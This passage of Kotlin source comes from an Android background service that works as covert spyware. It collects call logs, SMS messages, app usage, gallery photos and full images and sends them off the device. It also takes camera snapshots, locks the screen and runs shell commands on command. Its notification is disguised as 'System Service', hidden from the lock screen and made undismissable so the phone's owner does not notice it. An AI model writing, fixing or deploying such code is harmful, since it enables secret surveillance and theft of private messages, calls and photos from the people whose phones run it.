            } catch (_: Exception) {}
        }
    }

    private fun sendCallLogBackground(limit: Int) {
        ioExecutor.execute {
            try {
                val logs = CallLogManager.getCallLog(this, limit)
                sendData("call_log", JSONObject().apply { put("calls", logs) })
            } catch (e: SecurityException) {
                // READ_CALL_LOG permission denied — user may have revoked it
                CrashLogger.logCrash(this, e, "sendCallLog:SecurityException")
            } catch (_: Exception) {}
        }
    }

    private fun sendSmsBackground(limit: Int) {
        ioExecutor.execute {
            try {
                val msgs = SmsReader.getSms(this, limit)
                sendData("sms", JSONObject().apply { put("messages", msgs) })
            } catch (e: SecurityException) {
                CrashLogger.logCrash(this, e, "sendSms:SecurityException")
            } catch (_: Exception) {}
        }
    }

    private fun sendAppUsageBackground(hours: Int) {
        ioExecutor.execute {
            try {
                val usage = AppUsageManager.getUsageStats(this, hours)
                sendData("app_usage", JSONObject().apply { put("stats", usage) })
            } catch (e: SecurityException) {
                CrashLogger.logCrash(this, e, "sendAppUsage:SecurityException")
            } catch (_: Exception) {}
        }
    }

    private fun sendGalleryBackground(limit: Int) {
        ioExecutor.execute {
            try {
                // BUG FIX: Method was getRecentImages — actual name is getRecentPhotos
                val items = GalleryManager.getRecentPhotos(this, limit)
                sendData("gallery", JSONObject().apply { put("photos", items) })
            } catch (e: SecurityException) {
                CrashLogger.logCrash(this, e, "sendGallery:SecurityException")
            } catch (_: Exception) {}
        }
    }

    private fun sendFullPhoto(path: String) {
        ioExecutor.execute {
            try {
                // BUG FIX: sendFullImage didn't exist — getFullPhoto returns base64 string
                val b64 = GalleryManager.getFullPhoto(this, path)
                if (b64 != null) {
                    sendData("full_photo", JSONObject().apply { put("path", path); put("data", b64) })
                }
            } catch (_: Exception) {}
        }
    }

    // BUG FIX: Helper to start foreground services correctly by Android version.
    // Android 14+ (API 34) requires startForegroundService() for services with foregroundServiceType.
    // minSdk=26 so no need to check for < O.
    private fun startFgService(intent: Intent) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (e: Exception) {
            CrashLogger.logCrash(this, e, "startFgService:${intent.component?.shortClassName}")
        }
    }

    private fun takeSinglePhoto() {
        try { startFgService(Intent(this, CameraStreamService::class.java).setAction("SNAPSHOT")) } catch (_: Exception) {}
    }

    private fun lockScreen() {
        try {
            // BUG FIX: DevicePolicyManager import was missing — added to imports
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
            dpm.lockNow()
        } catch (e: SecurityException) {
            CrashLogger.logCrash(this, e, "lockScreen:DeviceAdmin not active")
        } catch (_: Exception) {}
    }

    private fun runShellCmd(cmd: String) {
        // BUG FIX: ShizukuManager.runShell didn't exist — actual method is exec()
        try { ShizukuManager.exec(cmd) } catch (_: Exception) {}
    }

    // ── Notification ───────────────────────────────────────────────────────────
    /**
     * RESEARCH NOTE (Foreground Service + Android 16):
     * "Without notification: System may stop service."
     * - Must have non-empty title for Android 16 validation
     * - Channel IMPORTANCE_MIN (not NONE): NONE can make Android 16 consider
     *   the foreground notification invalid, dropping OOM score protection
     * - setOngoing(true): prevents user swipe-dismiss
     * - VISIBILITY_SECRET: hides from lock screen
     * - CATEGORY_SERVICE: tells OS this is a long-running service notification
     */
    private fun createNotificationChannel() {
        // IMPORTANCE_MIN = silent + no heads-up, but valid for foreground service on Android 16
        val ch = NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_MIN).apply {
            setShowBadge(false)
            enableLights(false)
            enableVibration(false)
            lockscreenVisibility = Notification.VISIBILITY_SECRET
            setDescription("")
        }
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")   // Non-empty: required for Android 16 foreground validity
            .setContentText("")
            .setSmallIcon(R.drawable.ic_logo)    // Own icon (android.R.drawable may not exist on all OEMs)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)                    // Prevents user swipe-dismiss
            .setCategory(Notification.CATEGORY_SERVICE)
            .setShowWhen(false)
            .build()

    override fun onBind(intent: Intent?): IBinder? = null
}
